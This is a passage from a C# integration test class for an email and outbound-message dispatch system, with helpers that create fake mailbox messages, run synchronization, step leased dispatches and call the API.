        IReadOnlyList<ProviderAttachment>? attachments = null) =>
        new(
            ExternalMessageId: $"ext-{Guid.NewGuid():N}",
            Direction: MessageDirection.Inbound,
            ExternalThreadId: null,
            InternetMessageId: $"<{Guid.NewGuid():N}@studio.test>",
            Subject: subject,
            BodyText: "Plain body.",
            BodyHtml: html,
            SentAt: DateTimeOffset.UtcNow.AddMinutes(-5),
            ReceivedAt: DateTimeOffset.UtcNow,
            Folder: "Inbox",
            Participants:
            [
                new ProviderParticipant(ParticipantRole.From, from, "Sender"),
                new ProviderParticipant(ParticipantRole.To, "agent@example.test", "Agent"),
            ],
            Attachments: attachments ?? []);

    private static async Task<ConnectMailboxResponse> ConnectAsync(Actor actor, string code)
    {
        using HttpResponseMessage response = await actor.Client.PostAsJsonAsync(
            $"{actor.Root}/communication-accounts",
            new ConnectMailboxRequest("Fake", code, "http://localhost/callback"));

        await EnsureAsync(response);

        return (await response.Content.ReadFromJsonAsync<ConnectMailboxResponse>())!;
    }

    /// <summary>
    /// Runs one synchronization, the way the worker does.
    /// </summary>
    /// <remarks>
    /// The background worker is disabled under test. Driving the same synchronizer
    /// directly keeps the test deterministic without substituting a different
    /// implementation for the one that runs in production.
    /// </remarks>
    private async Task<MailboxSyncResult> SynchronizeAsync(Actor actor, Guid accountId)
    {
        await using AsyncServiceScope scope = _fixture.Factory.Services.CreateAsyncScope();

        ICommunicationAccountRepository accounts =
            scope.ServiceProvider.GetRequiredService<ICommunicationAccountRepository>();

        IUnitOfWork unitOfWork = scope.ServiceProvider.GetRequiredService<IUnitOfWork>();

        CommunicationAccount account = await accounts
            .FindAsync(
                new Domain.Organizations.OrganizationId(OrganizationOf(actor)),
                new CommunicationAccountId(accountId))
            .ConfigureAwait(false)
            ?? throw new InvalidOperationException("No such account.");

        MailboxSynchronizer synchronizer =
            scope.ServiceProvider.GetRequiredService<MailboxSynchronizer>();

        MailboxSyncResult result = await synchronizer
            .SynchronizeAsync(account)
            .ConfigureAwait(false);

        await unitOfWork.SaveChangesAsync().ConfigureAwait(false);

        return result;
    }

    /// <summary>
    /// Advances one dispatch by one step, exactly as the worker does.
    /// </summary>
    /// <remarks>
    /// <para>
    /// The claim takes whatever is next, because that is what a worker does. The
    /// suite shares one database, so rows left claimable by other tests are picked
    /// up first; each one is set aside and handed back at the end rather than being
    /// stepped, so no test advances another test's send.
    /// </para>
    /// <para>
    /// The clock is moved forward for the claim rather than the test waiting. A
    /// dispatch whose outcome is unknown is deliberately not reconciled at once -
    /// the backoff is what stops a worker spinning on a provider that cannot answer
    /// - and sleeping through it would take minutes to prove nothing extra
    /// (ADR-0028).
    /// </para>
    /// </remarks>
    private async Task<OutboundDispatchState> StepAsync(Guid dispatchId)
    {
        await using AsyncServiceScope scope = _fixture.Factory.Services.CreateAsyncScope();

        IOutboundDispatchRepository dispatches =
            scope.ServiceProvider.GetRequiredService<IOutboundDispatchRepository>();

        IUnitOfWork unitOfWork = scope.ServiceProvider.GetRequiredService<IUnitOfWork>();

        DateTimeOffset when = DateTimeOffset.UtcNow.AddMinutes(10);

        List<OutboundDispatch> setAside = [];
        OutboundDispatch? dispatch = null;

        for (int attempt = 0; attempt < 100 && dispatch is null; attempt++)
        {
            OutboundDispatch? claimed = await dispatches
                .ClaimNextAsync("test-worker", TimeSpan.FromMinutes(2), when)
                .ConfigureAwait(false);

            if (claimed is null)
            {
                break;
            }

            // Saved immediately, so the lease is visible to the next claim and the
            // same row is not handed out twice.
            await unitOfWork.SaveChangesAsync().ConfigureAwait(false);

            if (claimed.Id.Value == dispatchId)
            {
                dispatch = claimed;
            }
            else
            {
                setAside.Add(claimed);
            }
        }

        try
        {
            if (dispatch is null)
            {
                throw new InvalidOperationException(
                    $"Dispatch {dispatchId} was not claimable.");
            }

            OutboundSendProcessor processor =
                scope.ServiceProvider.GetRequiredService<OutboundSendProcessor>();

            OutboundStepResult result = await processor.StepAsync(dispatch).ConfigureAwait(false);

            dispatch.ReleaseLease(DateTimeOffset.UtcNow);

            return result.State;
        }
        finally
        {
            foreach (OutboundDispatch parked in setAside)
            {
                parked.ReleaseLease(DateTimeOffset.UtcNow);
            }

            await unitOfWork.SaveChangesAsync().ConfigureAwait(false);
        }
    }

    /// <summary>
    /// Claims whatever is next and keeps the lease, so a concurrent claim can be
    /// compared against it.
    /// </summary>
    /// <remarks>
    /// The lease is a second long. It has to be held while the other worker is
    /// still reaching, or the race proves nothing; it must also lapse quickly,
    /// because the row may belong to another test in the shared database.
    /// </remarks>
    private async Task<Guid?> ClaimOnceAsync(string owner)
    {
        await using AsyncServiceScope scope = _fixture.Factory.Services.CreateAsyncScope();

        IOutboundDispatchRepository dispatches =
            scope.ServiceProvider.GetRequiredService<IOutboundDispatchRepository>();

        IUnitOfWork unitOfWork = scope.ServiceProvider.GetRequiredService<IUnitOfWork>();

        OutboundDispatch? claimed = await dispatches
            .ClaimNextAsync(owner, TimeSpan.FromSeconds(1), DateTimeOffset.UtcNow)
            .ConfigureAwait(false);

        if (claimed is null)
        {
            return null;
        }

        await unitOfWork.SaveChangesAsync().ConfigureAwait(false);

        return claimed.Id.Value;
    }

    private async Task<string> ClientReferenceAsync(Guid dispatchId)
    {
        await using AgencyOsDbContextScope scope = Scope();

        return await scope.ClientReferenceAsync(dispatchId);
    }

    private AgencyOsDbContextScope Scope() => new(_fixture);

    private static Guid OrganizationOf(Actor actor) =>
        Guid.Parse(actor.Root["/api/v1/organizations/".Length..]);

    private static async Task<ComposeMessageResponse> ComposeAsync(Actor actor, Guid accountId)
    {
        using HttpResponseMessage response = await actor.Client.PostAsJsonAsync(
            $"{actor.Root}/outbound-messages",
            new ComposeMessageRequest(
                accountId,
                "Terms for The Undertow",
                "As discussed.",
                [new RecipientRequest("To", "producer@studio.test", "Producer")]));

        await EnsureAsync(response);

        return (await response.Content.ReadFromJsonAsync<ComposeMessageResponse>())!;
    }

    private static async Task<Guid> QueueAsync(Actor actor, Guid accountId)
    {
        ComposeMessageResponse composed = await ComposeAsync(actor, accountId);

        OutboundDispatchResponse draft = await DispatchAsync(actor, composed.DispatchId);

        await NoContentAsync(actor.Client.PostAsJsonAsync(
            $"{actor.Root}/outbound-messages/{composed.DispatchId}/queue",
            new QueueMessageRequest(draft.Version)));

        return composed.DispatchId;
    }

    private static Task<OutboundDispatchResponse> DispatchAsync(Actor actor, Guid dispatchId) =>
        GetAsync<OutboundDispatchResponse>(actor, $"outbound-messages/{dispatchId}");

    private static Task<IReadOnlyList<CommunicationAccountResponse>> AccountsAsync(Actor actor) =>
        GetListAsync<CommunicationAccountResponse>(actor, "communication-accounts");

    private static Task<IReadOnlyList<MessageSummaryResponse>> MessagesAsync(Actor actor) =>
        GetListAsync<MessageSummaryResponse>(actor, "messages");

    private static async Task<PersonDetailResponse> CreatePersonAsync(
        Actor actor,
        string name,
        string? email = null)
    {
        using HttpResponseMessage response = await actor.Client.PostAsJsonAsync(
            $"{actor.Root}/people", new CreatePersonRequest(name, Email: email));

        await EnsureAsync(response);

        return (await response.Content.ReadFromJsonAsync<PersonDetailResponse>())!;
    }

    private static async Task<T> GetAsync<T>(Actor actor, string route)
    {
        using HttpResponseMessage response = await actor.Client.GetAsync($"{actor.Root}/{route}");

        await EnsureAsync(response);

        return (await response.Content.ReadFromJsonAsync<T>())!;
    }

    private static async Task<IReadOnlyList<T>> GetListAsync<T>(Actor actor, string route) =>
        await GetAsync<T[]>(actor, route);

    private static async Task<T> PostAsync<T>(Actor actor, string route, object body)
    {
        using HttpResponseMessage response = await actor.Client.PostAsJsonAsync(
            $"{actor.Root}/{route}", body);

        await EnsureAsync(response);

        return (await response.Content.ReadFromJsonAsync<T>())!;
    }

    private static async Task NoContentAsync(Task<HttpResponseMessage> pending)
    {
        using HttpResponseMessage response = await pending;

        await EnsureAsync(response);
    }

    private static async Task EnsureAsync(HttpResponseMessage response)
    {
        if (response.IsSuccessStatusCode)
        {
            return;
        }

        string body = await response.Content.ReadAsStringAsync();

        Assert.Fail($"{(int)response.StatusCode} {response.StatusCode}: {body}");
    }
}
